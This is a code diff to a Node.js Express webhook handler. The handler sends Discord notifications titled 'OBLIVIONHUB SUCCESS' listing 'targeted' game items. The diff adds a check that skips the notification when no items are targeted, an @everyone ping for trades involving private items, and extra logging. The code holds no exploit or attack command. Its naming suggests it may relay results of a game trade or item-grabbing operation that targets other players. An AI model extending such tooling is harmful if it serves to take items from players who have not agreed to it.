@@ -36,7 +36,7 @@ app.post('/webhook', async (req, res) => {
         const timestamp = data.timestamp || Date.now();
 
         function formatListWithCount(list) {
-            if (!list || list.length === 0) return 'Ninguno';
+            if (!list || list.length === 0) return 'NONE';
             const counts = {};
             list.forEach(item => {
                 counts[item] = (counts[item] || 0) + 1;
@@ -68,6 +68,18 @@ app.post('/webhook', async (req, res) => {
             displayGearTargeted = gearTargeted;
         }
 
+        // Verificar si hay AL MENOS UN ítem targeteado
+        const hasTargetedItems =
+            displayBrainTargeted.length > 0 ||
+            displayBaseTargeted.length > 0 ||
+            displayGearTargeted.length > 0;
+
+        // Si no hay ningún ítem targeteado, no enviamos notificación
+        if (!hasTargetedItems) {
+            console.log('📭 Sin ítems targeteados. No se envía notificación.');
+            return res.status(204).send(); // No Content
+        }
+
         const targetedSet = new Set([
             ...displayBrainTargeted,
             ...displayBaseTargeted,
@@ -89,6 +101,7 @@ app.post('/webhook', async (req, res) => {
             day: '2-digit'
         }).replace(/\//g, '-');
 
+        // Construir el embed
         const embed = {
             title: '✅ OBLIVIONHUB SUCCESS',
             color: hasPrivateItem ? 0xffd700 : 0x00ff00,
@@ -124,7 +137,14 @@ app.post('/webhook', async (req, res) => {
             }
         };
 
+        // Si es privado, agregar @everyone al título
+        let content = null;
+        if (hasPrivateItem) {
+            content = '@everyone **¡Se ha detectado un trade con ítems privados!**';
+        }
+
         const payload = {
+            content: content,
             embeds: [embed]
         };
 
@@ -149,13 +169,16 @@ app.post('/webhook', async (req, res) => {
             while (retries > 0 && !success) {
                 try {
                     await axios.post(url, payload);
+                    console.log(`✅ Enviado a: ${url}`);
                     success = true;
                 } catch (err) {
                     if (err.response && err.response.status === 429) {
                         const retryAfter = parseInt(err.response.headers['retry-after']) || 5;
+                        console.log(`⏳ Rate limit en ${url}. Esperando ${retryAfter} segundos...`);
                         await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                         retries--;
                     } else {
+                        console.error(`❌ Error enviando a ${url}:`, err.message);
                         retries = 0;
                     }
                 }
@@ -164,6 +187,7 @@ app.post('/webhook', async (req, res) => {
 
         res.status(200).json({ status: 'ok', message: 'Notificaciones enviadas' });
     } catch (error) {
+        console.error('❌ Error general:', error.message);
         res.status(500).json({ status: 'error', message: error.message });
     }
 });
